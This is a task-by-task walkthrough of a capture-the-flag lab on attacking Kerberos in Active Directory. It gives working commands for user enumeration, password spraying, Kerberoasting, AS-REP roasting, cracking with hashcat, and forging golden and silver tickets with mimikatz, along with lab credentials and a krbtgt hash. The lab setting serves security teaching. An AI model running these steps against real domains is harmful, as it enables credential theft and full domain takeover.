## Machine Details
ipaddr=10.10.16.188

## Pre Reqs

### Install kerbrute (task 2)

1.) Download a precompiled binary for your OS - https://github.com/ropnop/kerbrute/releases

2.) Rename kerbrute_linux_amd64 to kerbrute

3.) chmod +x kerbrute - make kerbrute executable

### Install Impacket (task 4)

git clone https://github.com/SecureAuthCorp/impacket.git
pip3 install -r requirements.txt
python3 setup.py install

## TASK 1

Simple anser the questions


## Task 2 - Enumeration w/ Kerbrute

### Edit hosts file
```bash
$IP controller.local
```
### Download the User.txt wordlist
```bash
wget https://raw.github.com/Cryilllic/Active-Directory-Wordlists/master/User.txt
```
### using kerbrute run the following
```bash 
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

Use info from the above command to answer questions

## Task 3 - Harvesting Tickets w/ Rubeus

RDP or ssh to $IP

$username = Administrator
$password = P@$$W0rd

```bash
cd Downloads
Rubeus.exe harvest /interval:30
```

Save output to a file for later reference

### Brute-Forcing / Password-Spraying

add to windows hosts file

```windows
echo $IP controller.local >> c:\Windows\System32\drivers\etc\hosts
```
Now run password spray with Rubeus
```bash
Rubeus.exe brute /password:Password1 /noticket
```

Save out to a file for later reference

User the info gather to answer the questions

## Task 4 - Kerberoasting w/ Rubeus & Impacket

### Kerberoasting w/ Rubeus

Still on the windows machine

```bash
cd Downloads
Rubeus.exe kerberoast
```

Copy the hashes to a file on your local machine.

Get the following wordlist

```bash
wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Pass.txt
```

Use hashcat to find the password.

The room tells you which mode to use, so no need to figure that out.

```bash
hashcat -m 13100 -a 0 hash.txt Pass.txt
```


### Impacket

Navigate to the examples directoy

run the following to dump the kerberos hash
```python
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip $IP -request
```

Use the hashes to crack the hash with hashcat as previous

Use the info gathered to answer the questions

## Task 5 - AS-REP Roasting w/ Rubeus

On the windows machine

```bash
cd Downloads
Rubeus.exe asreproast
```

save output as hash

add ```23$``` after ```$krb5asrep$``` so that the first line will be ```$krb5asrep$23$```

Use hashcat and the same wordlist as previously to crack those hashes

```bash
hashcat -m 18200 hash.txt Pass.txt
```

Use the info gathered to answer the questions.

## Task 6 - Pass the Ticket w/ mimikatz

Just read, try and understand.

## Task 7 - Pass the Ticket w/ mimikatz 

On the windows machine

```bash
cd Downloads
mimikatz.exe
```

In the mimikatz console
```
privilege::debug
```
Ensure response is 20 ok

dump the hash and sec id needed to create a golden ticket.
```
lsadump::lsa /inject /name:krbtgt
```

make note of SID and NTLM Hash (primary)


### Create a golden/silver ticket

create a silver ticket for SQLService 

```
lsadump::lsa /inject /name:SQLService
```
```
Kerberos::golden /user:SQLService /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:cd40c9ed96265531b21fc5b1dafcfb0a /id:1103
```

Use info gathered/learned to answered the questions

## Kerberos Backdoors w/ mimikatz

Read and understand.
